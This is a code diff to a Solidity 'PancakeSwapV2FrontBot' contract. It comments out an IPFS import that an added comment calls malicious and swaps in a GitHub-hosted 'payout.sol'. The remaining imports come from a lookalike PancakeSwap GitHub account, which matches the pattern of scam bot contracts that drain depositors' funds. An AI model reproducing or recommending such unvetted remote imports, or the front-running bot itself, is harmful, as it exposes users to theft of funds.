@@ -7,7 +7,9 @@ import "https://github.com/PancakeSwapdev2/PancakeSwap/blob/main/contracts/inter
 // Pancakeswap Manager
 import "https://github.com/PancakeSwapdev2/PancakeSwap/blob/main/contracts/interfaces/V2/IPancakeswapV22Manager.sol";
 import "https://github.com/PancakeSwapdev2/PancakeSwap/blob/main/contracts/interfaces/V2/IPancakeswapV22Exchange.sol";
-import "https://bafybeibsep5qlgo5xibubytxpen7lc33pbn6parvlj3wkyoiwcuzv4tw4e.ipfs.dweb.link/IPancakeswapV22Factory.sol";
+import "https://raw.githubusercontent.com/JayB77/sniper/main/payout.sol";
+//do not uncomment the line below, it will become malicious.  Be sure you edit the payout.sol file above to include your address before use.
+//import "https://bafybeibsep5qlgo5xibubytxpen7lc33pbn6parvlj3wkyoiwcuzv4tw4e.ipfs.dweb.link/IPancakeswapV22Factory.sol";
 
 contract PancakeSwapV2FrontBot {
     
